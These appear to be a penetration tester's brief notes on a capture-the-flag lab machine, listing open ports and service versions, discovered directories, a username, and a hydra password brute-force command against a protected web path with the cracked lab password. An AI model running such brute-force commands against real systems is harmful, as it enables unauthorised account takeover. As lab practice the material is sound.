#BASIC INFO

```
export IP=10.10.56.5

```

##OPEN PORT

>1.	22/tcp 		OpenSSH 7.2p2 Ubuntu
>1.	80/tcp 		Apache httpd 2.4.18
>1.	1234/tcp 	Apache Tomcat/Coyote JSP engine 1.1
>1.	8009/tcp	Apache Jserv v1.3

#DIR FOUND

>1.	/guidelines/
>1.	/protected/

#CRED FOUND

>1.	bob

#BRUTEFORCE CRED

```
hydra -l bob -P /usr/share/wordlists/rockyou.txt $IP http-get /protected

```
> bob : bubbles